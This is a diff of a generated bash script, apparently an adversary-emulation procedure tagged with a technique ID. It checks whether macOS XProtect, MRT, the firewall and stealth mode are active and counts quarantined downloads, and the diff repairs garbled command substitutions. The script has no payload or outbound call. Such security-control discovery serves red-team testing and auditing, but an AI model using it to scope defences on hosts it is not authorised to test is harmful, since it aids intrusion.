     local xprotect_file="/System/Library/CoreServices/XProtect.bundle/Contents/Resources/XProtect.meta.plist"
-    if p$CMD_GREP XProtectService > /dev/null; then
-        local version=$(defaults read "$xprotect_file" Version 2>/dev/null || $CMD_PRINTF "%s\n" "Unknown")
+    if pgrep XProtectService > /dev/null; then
+        local version=$(defaults read "$xprotect_file" Version 2>/dev/null || echo "Unknown")
         $CMD_PRINTF "XPROTECT|active|version:%s\n" "$version"
     else
         $CMD_PRINTF "XPROTECT|inactive|\n"
@@ -2355,11 +2353,11 @@ discover_xprotect_info() {
 
 
 # Function: discover_mrt_info
-# Description: discover_mrt_info - Generated from YAML procedure
+# Description: discover_mrt_info - Generated from YAML
 discover_mrt_info() {
     local mrt_file="/System/Library/CoreServices/MRT.app/Contents/Info.plist"
-    if p$CMD_GREP MRT > /dev/null; then
-        local version=$(defaults read "$mrt_file" CFBundleVersion 2>/dev/null || $CMD_PRINTF "%s\n" "Unknown")
+    if pgrep MRT > /dev/null; then
+        local version=$(defaults read "$mrt_file" CFBundleVersion 2>/dev/null || echo "Unknown")
         $CMD_PRINTF "MRT|active|version:%s\n" "$version"
     else
         $CMD_PRINTF "MRT|inactive|\n"
@@ -2368,11 +2366,11 @@ discover_mrt_info() {
 
 
 # Function: discover_firewall_info
-# Description: discover_firewall_info - Generated from YAML procedure
+# Description: discover_firewall_info - Generated from YAML
 discover_firewall_info() {
-    local global_state=$(defaults read /Library/Preferences/com.apple.alf globalstate 2>/dev/null || $CMD_PRINTF "%s\n" "0")
+    local global_state=$(defaults read /Library/Preferences/com.apple.alf globalstate 2>/dev/null || echo "0")
     if [ "$global_state" = "1" ]; then
-        local stealth_mode=$(defaults read /Library/Preferences/com.apple.alf stealthenabled 2>/dev/null || $CMD_PRINTF "%s\n" "0")
+        local stealth_mode=$(defaults read /Library/Preferences/com.apple.alf stealthenabled 2>/dev/null || echo "0")
         $CMD_PRINTF "FIREWALL|enabled|stealth:%s\n" "$stealth_mode"
     else
         $CMD_PRINTF "FIREWALL|disabled|\n"
@@ -2381,21 +2379,38 @@ discover_firewall_info() {
 
 
 # Function: discover_quarantine_info
-# Description: discover_quarantine_info - Generated from YAML procedure
+# Description: discover_quarantine_info - Generated from YAML
 discover_quarantine_info() {
     local downloads_dir="$HOME/Downloads"
     local quarantined_files=0
     
     if [ -d "$downloads_dir" ]; then
-        quarantined_files=$(find "$downloads_dir" -type f -exec xat$CMD_TR -l {} \; 2>/dev/null | $CMD_GREP -c "com.apple.quarantine" || $CMD_PRINTF "%s\n" "0")
+        quarantined_files=$(find "$downloads_dir" -type f -exec xattr -l {} \; 2>/dev/null | $CMD_GREP -c "com.apple.quarantine" || echo "0")
         $CMD_PRINTF "QUARANTINE|active|files:%s\n" "$quarantined_files"
     else
         $CMD_PRINTF "QUARANTINE|unknown|files:0\n"
     fi
-} 
+}   
 
 
 JOB_ID=$(core_generate_job_id)
+
+# Purpose: Get log filename dynamically based on PROCEDURE_NAME
+# Inputs: None
+# Outputs: Log filename string
+# - Sets LOG_FILE_NAME and SYSLOG_TAG globals if not already set
+core_get_log_filename() {
+    if [ -z "$LOG_FILE_NAME" ]; then
+        if [ -n "$PROCEDURE_NAME" ]; then
+            LOG_FILE_NAME="${TTP_ID}_${PROCEDURE_NAME}.log"
+            SYSLOG_TAG="${TTP_ID}_${PROCEDURE_NAME}"
+        else
+            LOG_FILE_NAME="${TTP_ID}.log"
+            SYSLOG_TAG="${TTP_ID}"
+        fi
+    fi
+    echo "$LOG_FILE_NAME"
+}
 
 # Execute main function with all arguments
 core_main "$@" 
